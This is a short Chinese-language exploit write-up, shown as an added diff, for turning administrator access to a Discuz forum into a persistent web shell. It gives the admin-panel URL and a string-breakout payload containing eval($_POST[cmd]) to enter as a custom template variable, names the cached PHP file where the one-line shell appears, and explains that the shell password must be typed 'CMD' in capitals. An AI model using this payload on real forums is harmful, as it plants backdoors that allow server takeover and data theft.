@@ -1,0 +1,20 @@
+利用方法（论坛地址改成自己的），先用管理员帐号登陆后台，无需论坛创始人，管理员等级即可：
+http://www.oldjun.com/bbs/admincp.php?action=styles&operation=edit&id=1&adv=1
+中，最下面有个“自定义模板变量”，变量中填：
+
+OLDJUN', '#999');eval($_POST[cmd]);//
+
+替换内容随便输入：1111，然后提交，一句话木马就产生了：
+http://www.oldjun.com/bbs/forumdata/cache/style_1.php
+
+如果你修改的style的id是2的话，对于的shell就是style_2.php。
+
+这个风格模板可以导入导出的，于是有了ring04h的那个dzshell，嫌麻烦可以直接用那个导入风格获取shell。
+
+注：很多人反应连不上一句话，我发现我文章少说了一句：
+
+$evaluate .= $type == 'VAR' ? "\$$key = '$val';\n" : "define('".strtoupper($key)."', '$val');\n";
+
+这句话是说所有的变量名换成大写的了！
+
+因此请用大写的CMD做为你一句话的密码！
